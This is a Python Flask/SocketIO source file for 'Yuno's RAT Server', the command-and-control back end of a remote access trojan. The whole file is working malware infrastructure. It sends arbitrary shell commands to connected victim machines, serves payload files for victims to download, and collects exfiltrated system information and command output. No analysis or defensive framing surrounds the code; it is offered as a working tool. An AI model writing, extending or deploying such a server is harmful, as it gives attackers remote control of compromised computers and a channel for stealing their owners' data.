#!/usr/bin/env python3
import os
import json
import datetime
from flask import Flask, render_template, request, send_from_directory, jsonify
from flask_socketio import SocketIO, emit
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['DOWNLOAD_FOLDER'] = 'downloads'
socketio = SocketIO(app, cors_allowed_origins="*")

# Ensure directories exist
for folder in [app.config['UPLOAD_FOLDER'], app.config['DOWNLOAD_FOLDER']]:
    if not os.path.exists(folder):
        os.makedirs(folder)

# In-memory storage
connected_clients = set()  # Track connected client IDs
client_info = {}  # Store client system info {client_id: system_info}
command_outputs = []  # Store command outputs [{client_id, command, output, current_dir, timestamp}]
exfiltrated_files = []  # Store exfiltrated files [{client_id, filename, content, timestamp}]

@app.route('/')
def index():
    """Render the main page with connected clients and exfiltrated files."""
    return render_template('index.html', clients=list(connected_clients), files=[f['filename'] for f in exfiltrated_files])

@app.route('/send_command', methods=['POST'])
def send_command():
    """Handle command submission from the web interface."""
    client_id = request.form.get('client_id')
    command = request.form.get('command')

    if not client_id or not command:
        return jsonify({"status": "error", "message": "Missing client_id or command"}), 400

    print(f"[*] Sending command '{command}' to {client_id}")
    socketio.emit('command', command, to=client_id)
    return jsonify({"status": "success", "message": f"Command '{command}' sent to {client_id}"})

@app.route('/upload_file', methods=['POST'])
def upload_file():
    """Handle file uploads for downloading to victims."""
    if 'file' not in request.files:
        return jsonify({"status": "error", "message": "No file part"}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({"status": "error", "message": "No selected file"}), 400
    if file:
        filename = secure_filename(file.filename)
        file_path = os.path.join(app.config['DOWNLOAD_FOLDER'], filename)
        file.save(file_path)
        return jsonify({"status": "success", "filename": filename})

@app.route('/download/<filename>')
def download(filename):
    """Serve files for clients to download."""
    return send_from_directory(app.config['DOWNLOAD_FOLDER'], filename)

@socketio.on('connect')
def handle_connect():
    """Handle new client connections."""
    client_id = request.sid
    connected_clients.add(client_id)
    print(f"[*] Client connected: {client_id}")
    emit('client_update', list(connected_clients), broadcast=True)
    emit('request_client_info', broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnections."""
    client_id = request.sid
    if client_id in connected_clients:
        connected_clients.remove(client_id)
        client_info.pop(client_id, None)
        print(f"[*] Client disconnected: {client_id}")
        emit('client_update', list(connected_clients), broadcast=True)
        emit('request_client_info', broadcast=True)

@socketio.on('exfil_data')
def handle_exfil_data(sid, data):
    """Handle exfiltrated data from clients."""
    client_id = request.sid
    print(f"[*] Received exfil_data from {client_id}: {data}")
    try:
        data = json.loads(data) if isinstance(data, str) else data
    except json.JSONDecodeError as e:
        print(f"[!] JSON decode error for exfil_data from {client_id}: {e}")
        return

    data_type = data.get('type')
    timestamp = datetime.datetime.now()

    if data_type == "system_info":
        system_info = data.get('system', {})
        client_info[client_id] = system_info
        filename = f"{client_id}_{timestamp.strftime('%Y%m%d_%H%M%S')}_sysinfo.json"
        content = json.dumps(data, indent=4)
        exfiltrated_files.append({
            'client_id': client_id,
            'filename': filename,
            'content': content,
            'timestamp': timestamp
        })
        print(f"[*] Exfiltrated system info stored in memory: {filename}")
        emit('exfil_data', json.dumps({"type": "system_info", "filename": filename}), broadcast=True)

    elif data_type == "command_output":
        command = data.get('command', 'unknown')
        output = data.get('output', '')
        current_dir = data.get('current_dir', 'unknown')
        command_outputs.append({
            'client_id': client_id,
            'command': command,
            'output': output,
            'current_dir': current_dir,
            'timestamp': timestamp
        })
        print(f"[*] Command output received: {command} -> {output}")
        emit('command_output', {
            'timestamp': timestamp.strftime("%Y-%m-%d %H:%M:%S"),
            'client_id': client_id,
            'command': command,
            'output': output,
            'current_dir': current_dir
        }, broadcast=True)

    client_info_list = [
        {'id': cid, 'system': info}
        for cid, info in client_info.items()
    ]
    emit('client_info', client_info_list, broadcast=True)

@socketio.on('request_client_info')
def handle_request_client_info(sid):
    """Handle requests for client info from the web interface."""
    print(f"[*] Handling request_client_info from {sid}")
    client_info_list = [
        {'id': cid, 'system': info}
        for cid, info in client_info.items()
    ]
    emit('client_info', client_info_list)

if __name__ == "__main__":
    print("=== Yuno's RAT Server ===")
    print("A remote access server by Yuno\n")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)